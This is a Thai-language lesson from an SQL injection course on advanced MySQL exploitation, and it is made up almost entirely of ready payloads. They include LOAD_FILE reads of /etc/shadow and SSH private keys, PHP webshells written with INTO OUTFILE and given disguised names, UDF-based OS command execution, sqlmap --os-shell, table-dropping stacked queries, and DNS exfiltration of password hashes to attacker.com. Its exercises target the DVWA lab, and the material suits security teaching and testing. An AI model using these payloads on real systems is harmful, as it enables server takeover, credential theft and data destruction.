# Part 019: MySQL Advanced Exploitation

## ภาพรวม

เรียนรู้เทคนิคขั้นสูงสำหรับ MySQL ตั้งแต่ file operations ไปจนถึง OS command execution

**ขั้นตอนที่ 226-245**

---

## 226. MySQL File Read - LOAD_FILE()

### 26.1 พื้นฐาน LOAD_FILE()

```sql
-- อ่าน /etc/passwd
SELECT LOAD_FILE('/etc/passwd');

-- UNION injection
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -

-- ไฟล์อื่นๆ ที่น่าสนใจ
SELECT LOAD_FILE('/etc/shadow');
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/var/www/html/wp-config.php');
SELECT LOAD_FILE('/home/user/.bash_history');
SELECT LOAD_FILE('/root/.ssh/id_rsa');
```

### 26.2 เงื่อนไขที่จำเป็น

```sql
-- ตรวจสอบ FILE privilege
SELECT file_priv FROM mysql.user WHERE user=user();

-- ตรวจสอบ secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';
-- ถ้า secure_file_priv='' หรือ NULL = ไม่มีข้อจำกัด
-- ถ้าระบุ path = อ่านได้เฉพาะใน path นั้น
```

---

## 227. MySQL File Write - INTO OUTFILE

### 27.1 Webshell Upload

```sql
-- PHP webshell พื้นฐาน
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- ผ่าน UNION
' UNION SELECT '<?php system($_GET["cmd"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'-- -

-- หลังจาก upload:
curl 'http://target.com/shell.php?cmd=whoami'
curl 'http://target.com/shell.php?cmd=id'
curl 'http://target.com/shell.php?cmd=cat+/etc/passwd'
```

### 27.2 Webshell ที่ซับซ้อนกว่า

```sql
-- Shell แบบ POST (ซ่อนง่ายกว่า GET)
SELECT '<?php if(isset($_POST["c"])){system($_POST["c"]);} ?>' 
INTO OUTFILE '/var/www/html/update.php';

-- B64 encoded shell (bypass WAF)
SELECT '<?php eval(base64_decode($_POST["x"])); ?>'
INTO OUTFILE '/var/www/html/cache.php';
```

---

## 228. MySQL Stacked Queries

```sql
-- ถ้า driver รองรับ multi-statements
'; SELECT SLEEP(5)-- -
'; CREATE TABLE hacked (data TEXT)-- -
'; INSERT INTO hacked VALUES ('pwned')-- -
'; DROP TABLE users-- -

-- PHP MySQLi: mysqli_multi_query() รองรับ
-- PHP PDO: emulate_prepares=true รองรับ
```

---

## 229. MySQL UDF - User Defined Functions

### 29.1 UDF สำหรับ OS Command Execution

```sql
-- Step 1: ตรวจสอบ plugin directory
SHOW VARIABLES LIKE 'plugin_dir';
-- ผล: /usr/lib/mysql/plugin/

-- Step 2: ตรวจสอบ architecture
SELECT @@version_compile_os, @@version_compile_machine;

-- Step 3: เขียน UDF library ผ่าน SQL (hex encoded)
-- ไฟล์ lib_mysqludf_sys.so สำหรับ Linux (64-bit)
SELECT 0x[HEX_OF_SO_FILE] INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- Step 4: สร้าง function
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

-- Step 5: รัน command
SELECT sys_eval('whoami');
SELECT sys_eval('id');
SELECT sys_eval('cat /etc/passwd');

-- Step 6: ทำความสะอาด
DROP FUNCTION sys_eval;
```

### 29.2 SQLMap UDF Automation

```bash
# SQLMap สามารถ automate UDF upload
sqlmap -u "http://example.com/item?id=1" --os-shell --dbms=mysql
```

---

## 230. Error-Based Double Query

### 30.1 GROUP BY FLOOR(RAND(0)*2)

```sql
-- Classic MySQL error-based
1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(
  (SELECT database()),
  FLOOR(RAND(0)*2)
) x FROM information_schema.tables GROUP BY x) y)

-- ดึง version
1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(
  (SELECT version()),
  0x3a,
  FLOOR(RAND(0)*2)
) x FROM information_schema.tables GROUP BY x) a)

-- ดึง tables
1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(
  (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),
  0x3a,
  FLOOR(RAND(0)*2)
) x FROM information_schema.tables GROUP BY x) a)
```

---

## 231. MySQL Privilege Escalation

```sql
-- ตรวจสอบ privileges
SHOW GRANTS;
SHOW GRANTS FOR CURRENT_USER();

-- ตรวจสอบ global privileges
SELECT * FROM mysql.user WHERE user=user()\G

-- ถ้ามี SUPER privilege
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>';
SET GLOBAL general_log = 'OFF';
```

---

## 232. DNS Exfiltration

```sql
-- MySQL DNS lookup ผ่าน LOAD_FILE()
-- ต้องการ FILE privilege และ DNS server ที่ควบคุม
SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT database()),
  '.attacker.com\\share'));

-- ใช้ UDF สำหรับ DNS exfiltration (ถ้ามี UDF)
SELECT sys_eval(CONCAT('nslookup ', 
  (SELECT HEX(password) FROM users LIMIT 0,1),
  '.attacker.com'));
```

---

## 233. Second-Order Injection ใน MySQL

```sql
-- ขั้นตอน:
-- 1. Register username: admin'--
INSERT INTO users (username, password) VALUES ('admin\'--', 'hash');
-- ข้อมูลถูก escape และเก็บใน DB

-- 2. เมื่อระบบดึงข้อมูลมาใช้ใน query อื่น (ไม่ escape อีกครั้ง)
UPDATE passwords SET password='new' WHERE username='admin'--' AND old_password='...';
-- กลายเป็น: UPDATE passwords SET password='new' WHERE username='admin'
-- แสดงว่า comment ตัด AND old_password check ออก
```

---

## 234. REGEXP-Based Blind Extraction

```sql
-- ใช้ REGEXP แทน SUBSTRING (WAF bypass)
1 AND database() REGEXP '^a'
1 AND database() REGEXP '^b'
1 AND database() REGEXP '^t'
1 AND database() REGEXP '^te'
1 AND database() REGEXP '^tes'
1 AND database() REGEXP '^test'

-- ดึง table names
1 AND (SELECT table_name FROM information_schema.tables 
  WHERE table_schema=database() LIMIT 0,1) REGEXP '^u'
```

---

## 235. แบบฝึกหัด

1. ทดสอบ LOAD_FILE() บน DVWA:
   ```sql
   ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
   ```

2. ทดสอบ INTO OUTFILE (ถ้า writable):
   ```sql
   ' UNION SELECT '<?php phpinfo(); ?>',NULL INTO OUTFILE '/tmp/test.php'-- -
   ```

3. ทดสอบ error-based double query:
   ```sql
   1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
   ```

---

## สรุป

MySQL Advanced:
- **LOAD_FILE()** - อ่านไฟล์ระบบ (ต้องการ FILE privilege)
- **INTO OUTFILE** - เขียนไฟล์/webshell (ต้องการ write permission)
- **UDF** - OS command execution
- **Error-based** - ดึงข้อมูลผ่าน error message

---

*Part 019 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
